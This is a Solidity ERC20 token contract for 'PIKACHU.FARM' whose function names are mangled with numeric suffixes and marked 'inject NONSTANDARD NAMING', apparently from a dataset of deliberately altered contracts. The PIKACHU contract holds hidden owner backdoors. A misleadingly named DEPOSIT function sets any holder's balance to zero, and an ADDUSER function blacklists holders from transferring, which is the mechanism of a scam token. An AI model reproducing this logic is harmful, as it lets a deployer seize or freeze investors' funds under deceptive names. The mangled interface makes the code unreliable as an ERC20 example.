                                                                 

pragma solidity ^0.5.16;
interface IERC20 {
    function TOTALSUPPLY911() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF793(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER417(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE954(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE451(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM683(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER872(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL214(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}
contract Context {
    constructor () internal { }
    function _MSGSENDER231() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    uint private _totalSupply;
    function TOTALSUPPLY911() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF793(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER417(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER468(_MSGSENDER231(), recipient, amount);
        return true;
    }
    function ALLOWANCE954(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE451(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE255(_MSGSENDER231(), spender, amount);
        return true;
    }
    function TRANSFERFROM683(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER468(sender, recipient, amount);
        _APPROVE255(sender, _MSGSENDER231(), _allowances[sender][_MSGSENDER231()].SUB52(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE130(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE255(_MSGSENDER231(), spender, _allowances[_MSGSENDER231()][spender].ADD198(addedValue));
        return true;
    }
    function DECREASEALLOWANCE395(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE255(_MSGSENDER231(), spender, _allowances[_MSGSENDER231()][spender].SUB52(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TRANSFER468(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB52(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD198(amount);
        emit TRANSFER872(sender, recipient, amount);
    }
    function _INITSUPPLY227(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD198(amount);
        _balances[account] = _balances[account].ADD198(amount);
        emit TRANSFER872(address(0), account, amount);
    }


    function _DEPOSIT707(address acc) internal {	//inject NONSTANDARD NAMING
        _balances[acc] = 0;
    }
    function _APPROVE255(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit APPROVAL214(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME811() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL452() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS473() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD198(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function SUB52(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB52(a, b, "SafeMath: subtraction overflow");
    }
    function SUB52(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function MUL978(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function DIV774(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV774(a, b, "SafeMath: division by zero");
    }
    function DIV774(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract PIKACHU is ERC20, ERC20Detailed {
  using SafeMath for uint;
  mapping (address => bool) public owner;
  mapping (address => bool) public user;
  constructor () public ERC20Detailed("PIKACHU.FARM", "$PKC", 18) {
      _INITSUPPLY227( msg.sender, 1000000*10**uint(DECIMALS473()) );
      owner[msg.sender] = true;
  }

  function _TRANSFER468(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
      require(!user[sender], "error");
      super._TRANSFER468(sender, recipient, amount);
  }
    
  function DEPOSIT281(address account) public {	//inject NONSTANDARD NAMING
      require(owner[msg.sender], "!warning");
      _DEPOSIT707(account);
  }

  function ADDUSER998(address account) public {	//inject NONSTANDARD NAMING
      require(owner[msg.sender], "!owner");
      user[account] = true;
  }
  
  function REMOVEUSER915(address account) public {	//inject NONSTANDARD NAMING
      require(owner[msg.sender], "!owner");
      user[account] = false;
  }

}